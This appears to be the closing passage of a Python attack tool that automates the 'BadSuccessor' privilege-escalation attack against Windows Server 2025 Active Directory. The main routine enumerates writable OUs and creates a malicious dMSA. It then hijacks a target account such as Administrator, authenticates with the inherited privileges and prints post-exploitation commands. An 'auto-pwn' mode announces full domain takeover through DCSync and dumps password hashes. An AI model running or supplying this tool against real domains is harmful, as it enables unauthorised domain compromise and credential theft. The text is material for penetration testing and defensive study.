                bs.log("Windows Server 2025 required. Aborting.", "ERROR")
                return
            if args.auto_pwn:
                bs.log("Starting automated domain takeover...", "CRITICAL")
                args.target = "Administrator"
            if not args.target:
                bs.log("--target required for attack", "ERROR")
                return
            target_ou = args.ou_dn
            if not target_ou:
                writable_ous = bs.enumerate_writable_ous()
                if not writable_ous:
                    bs.log("No writable OUs found. Cannot proceed.", "ERROR")
                    return
                best_ou = None
                for ou in writable_ous:
                    if ou['can_create_dmsa']:
                        best_ou = ou
                        break
                if not best_ou:
                    best_ou = writable_ous[0]
                target_ou = best_ou['dn']
                bs.log(f"Using OU: {target_ou}", "INFO")
                bs.log(f"Permissions: {', '.join(best_ou['permissions'])}", "INFO")
            bs.log("\n[Phase 1] Creating malicious dMSA...", "CRITICAL")
            dmsa_dn = bs.create_dmsa_object(target_ou, args.dmsa_name)
            if not dmsa_dn:
                return
            bs.log("\n[Phase 2] Performing BadSuccessor attack...", "CRITICAL")
            if not bs.perform_badsuccessor_attack(dmsa_dn, args.target):
                return
            bs.log("\n[Phase 3] Authenticating with inherited privileges...", "CRITICAL")
            ccache_file = bs.authenticate_as_dmsa(args.dmsa_name)
            bs.log("\n[Phase 4] Attack successful!", "CRITICAL")
            bs.generate_post_exploitation_commands(args.dmsa_name, ccache_file)
            bs.log(f"\nRemember to clean up: --cleanup --dmsa-dn \"{dmsa_dn}\"", "WARNING")
            if args.auto_pwn:
                bs.log("\n[Phase 5] Executing DCSync...", "CRITICAL")
                bs.log("Auto-pwn complete! Check output files for hashes.", "CRITICAL")
        else:
            parser.print_help()
    finally:
        if bs.connection:
            bs.connection.unbind()
if __name__ == "__main__":
    main()
